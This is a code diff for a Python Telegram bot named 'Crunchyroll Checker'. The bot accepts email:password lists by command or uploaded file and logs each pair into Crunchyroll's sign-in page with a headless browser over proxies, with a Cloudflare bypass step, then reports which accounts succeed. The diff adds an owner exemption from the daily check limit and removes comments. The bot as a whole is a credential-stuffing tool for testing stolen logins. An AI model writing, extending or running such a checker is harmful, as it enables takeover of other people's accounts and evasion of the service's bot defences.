@@ -173,11 +173,15 @@ def main_menu_keyboard():
 
 async def send_main_menu(update, context, edit=False):
     user_id = update.effective_user.id
-    usage = await get_user_usage(user_id)
-    remaining = DAILY_LIMIT - usage["count"]
+    if user_id == OWNER_ID:
+        usage_text = "👑 Owner – Unlimited Checks!"
+    else:
+        usage = await get_user_usage(user_id)
+        remaining = DAILY_LIMIT - usage["count"]
+        usage_text = f"🔹 You have *{remaining}* checks left today."
     caption = (
         f"👋 *Welcome to Crunchyroll Checker!*\n\n"
-        f"🔹 You have *{remaining}* checks left today.\n"
+        f"{usage_text}\n"
         f"🔹 Use /chk or upload a .txt file.\n"
         f"🔹 Need help? Use the buttons below."
     )
@@ -237,13 +241,19 @@ async def main_menu_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
     elif data == "profile":
-        usage = await get_user_usage(user_id)
-        remaining = DAILY_LIMIT - usage["count"]
-        text = f"📊 *Your Profile*\n\n"
-        text += f"🆔 User ID: `{user_id}`\n"
-        text += f"📅 Today's checks: *{usage['count']}* / {DAILY_LIMIT}\n"
-        text += f"✅ Remaining: *{remaining}*\n"
-        text += f"🔄 Resets at midnight UTC."
+        if user_id == OWNER_ID:
+            text = f"👑 *Owner Profile*\n\n"
+            text += f"🆔 User ID: `{user_id}`\n"
+            text += f"📅 Today's checks: *∞ Unlimited*\n"
+            text += f"✅ Remaining: *∞ Unlimited*"
+        else:
+            usage = await get_user_usage(user_id)
+            remaining = DAILY_LIMIT - usage["count"]
+            text = f"📊 *Your Profile*\n\n"
+            text += f"🆔 User ID: `{user_id}`\n"
+            text += f"📅 Today's checks: *{usage['count']}* / {DAILY_LIMIT}\n"
+            text += f"✅ Remaining: *{remaining}*\n"
+            text += f"🔄 Resets at midnight UTC."
         await query.answer()
         await query.edit_message_caption(
             caption=text,
@@ -313,14 +323,17 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No valid accounts found.")
         return
 
-    usage = await get_user_usage(user_id)
-    remaining = DAILY_LIMIT - usage["count"]
-    if remaining <= 0:
-        await update.message.reply_text("⛔ Daily limit reached. Please wait until midnight UTC.")
-        return
-
-    if len(accounts) > remaining:
-        accounts = accounts[:remaining]
+    # ---- Owner skip limit ----
+    if user_id != OWNER_ID:
+        usage = await get_user_usage(user_id)
+        remaining = DAILY_LIMIT - usage["count"]
+        if remaining <= 0:
+            await update.message.reply_text("⛔ Daily limit reached. Please wait until midnight UTC.")
+            return
+        if len(accounts) > remaining:
+            accounts = accounts[:remaining]
+    else:
+        remaining = 999999  # unlimited
 
     msg = await update.message.reply_text(f"🔄 Processing {len(accounts)} account(s)...")
 
@@ -332,15 +345,23 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    usage = await get_user_usage(user_id)
-    remaining = DAILY_LIMIT - usage["count"]
-    await update.message.reply_text(
-        f"📊 *Your Usage*\n"
-        f"Used: *{usage['count']}* / {DAILY_LIMIT}\n"
-        f"Remaining: *{remaining}*\n"
-        f"Resets at 00:00 UTC",
-        parse_mode="Markdown"
-    )
+    if user_id == OWNER_ID:
+        await update.message.reply_text(
+            f"👑 *Owner – Unlimited Checks!*\n"
+            f"You have no daily limit.\n"
+            f"Enjoy unlimited usage! 🚀",
+            parse_mode="Markdown"
+        )
+    else:
+        usage = await get_user_usage(user_id)
+        remaining = DAILY_LIMIT - usage["count"]
+        await update.message.reply_text(
+            f"📊 *Your Usage*\n"
+            f"Used: *{usage['count']}* / {DAILY_LIMIT}\n"
+            f"Remaining: *{remaining}*\n"
+            f"Resets at 00:00 UTC",
+            parse_mode="Markdown"
+        )
 
 async def cmd_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"📞 Contact support: [Click here]({SUPPORT_LINK})", parse_mode="Markdown")
@@ -406,14 +427,16 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No valid `email:password` lines.")
         return
 
-    usage = await get_user_usage(user_id)
-    remaining = DAILY_LIMIT - usage["count"]
-    if remaining <= 0:
-        await update.message.reply_text("⛔ Daily limit reached.")
-        return
-
-    if len(accounts) > remaining:
-        accounts = accounts[:remaining]
+    # ---- Owner skip limit ----
+    if user_id != OWNER_ID:
+        usage = await get_user_usage(user_id)
+        remaining = DAILY_LIMIT - usage["count"]
+        if remaining <= 0:
+            await update.message.reply_text("⛔ Daily limit reached.")
+            return
+        if len(accounts) > remaining:
+            accounts = accounts[:remaining]
+    # else: no limit for owner
 
     msg = await update.message.reply_text(f"📄 Queuing {len(accounts)} accounts from file...")
     for email, password in accounts:
@@ -449,7 +472,7 @@ async def login_crunchyroll(email: str, password: str) -> dict:
     async with async_playwright() as p:
         browser = await p.chromium.launch(
             headless=HEADLESS,
-            slow_mo=0,  # no artificial delay
+            slow_mo=0,
             args=['--incognito'],
             proxy=proxy
         )
@@ -462,18 +485,14 @@ async def login_crunchyroll(email: str, password: str) -> dict:
 
         try:
             sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
-            # aggressive timeouts
             await page.goto(sso_url, timeout=20000)
-            # wait only for the email field to appear (much faster than waiting for network idle)
             await page.wait_for_selector("input[name='email'], input[type='email']", timeout=8000)
 
-            # Cloudflare bypass (if any, it will be detected now)
             if not await bypass_cloudflare(page):
                 result["message"] = "⏱️ Cloudflare timed out."
                 result["screenshot"] = await page.screenshot()
                 return result
 
-            # Cookie consent
             for sel in ["#onetrust-accept-btn-handler", "button:has-text('Accept All')"]:
                 try:
                     btn = await page.wait_for_selector(sel, timeout=2000)
@@ -483,32 +502,26 @@ async def login_crunchyroll(email: str, password: str) -> dict:
                 except:
                     pass
 
-            # Email – short timeouts
             email_field = await page.wait_for_selector("input[name='email'], input[type='email']", timeout=4000)
             await email_field.fill(email)
             await asyncio.sleep(0.1)
 
-            # Password
             password_field = await page.wait_for_selector("input[type='password']", timeout=4000)
             await password_field.fill(password)
             await asyncio.sleep(0.1)
 
-            # Submit
             submit_btn = await page.wait_for_selector("button[type='submit'], button:has-text('LOGIN')", timeout=4000)
             await submit_btn.click()
 
-            # Wait briefly, then wait for network idle with short timeout
             await asyncio.sleep(2)
             try:
                 await page.wait_for_load_state("networkidle", timeout=10000)
             except:
-                pass  # proceed anyway
+                pass
 
-            # Now safe to read content
             content = await page.content()
             url = page.url
 
-            # If still verifying, give it a few extra seconds
             if "verifying" in content.lower():
                 for _ in range(5):
                     await asyncio.sleep(2)
@@ -516,7 +529,6 @@ async def login_crunchyroll(email: str, password: str) -> dict:
                     if "verifying" not in content.lower():
                         break
 
-            # Final check
             if "incorrect" in content.lower() or "wrong" in content.lower():
                 result["message"] = "❌ Wrong email or password"
             elif "www.crunchyroll.com/" in url and "login" not in url and "verifying" not in content.lower():
@@ -551,10 +563,8 @@ async def worker():
             password = task["password"]
             msg_id = task.get("msg_id")
 
-            # Start login immediately
             login_task = asyncio.create_task(login_crunchyroll(email, password))
 
-            # Ultra-short progress bar (5 steps, 1.2s each = ~6s)
             steps = [
                 ("Grab a cup of tea... 0%", 1.5),
                 ("▰▱▱▱▱▱▱▱▱▱ 20%\n(⁠◕‿◕⁠)", 1.2),
@@ -590,7 +600,6 @@ async def worker():
                 except Exception:
                     pass
 
-            # If login still running, show 100%
             if not login_task.done():
                 try:
                     await bot.edit_message_text(
@@ -603,15 +612,19 @@ async def worker():
                 await login_task
 
             result = login_task.result()
-            new_count = await increment_usage(user_id)
+            # Owner doesn't consume usage
+            if user_id != OWNER_ID:
+                new_count = await increment_usage(user_id)
+                used_text = f"{new_count}/{DAILY_LIMIT}"
+            else:
+                new_count = 0
+                used_text = "∞ Unlimited"
 
-            # Delete status
             try:
                 await bot.delete_message(chat_id=chat_id, message_id=msg_id)
             except Exception:
                 pass
 
-            # Boxed result
             if result["success"]:
                 box = (
                     "╭──── success ────╮\n"
@@ -619,7 +632,7 @@ async def worker():
                     "  successfully 🌀\n"
                     "╰─────────────╯"
                 )
-                caption = f"{box}\n\n`{email}` (Used {new_count}/{DAILY_LIMIT} today)"
+                caption = f"{box}\n\n`{email}` (Used {used_text} today)"
                 await bot.send_photo(
                     chat_id=chat_id,
                     photo=SUCCESS_IMAGE,
@@ -633,14 +646,14 @@ async def worker():
                     "╰────────────────────╯"
                 )
                 if result["screenshot"]:
-                    caption = f"{box}\n\n`{email}` – {result['message']} (Used {new_count}/{DAILY_LIMIT} today)"
+                    caption = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
                     await bot.send_photo(
                         chat_id=chat_id,
                         photo=result["screenshot"],
                         caption=caption
                     )
                 else:
-                    text = f"{box}\n\n`{email}` – {result['message']} (Used {new_count}/{DAILY_LIMIT} today)"
+                    text = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
                     await bot.send_message(chat_id=chat_id, text=text)
 
             await asyncio.sleep(GLOBAL_DELAY)
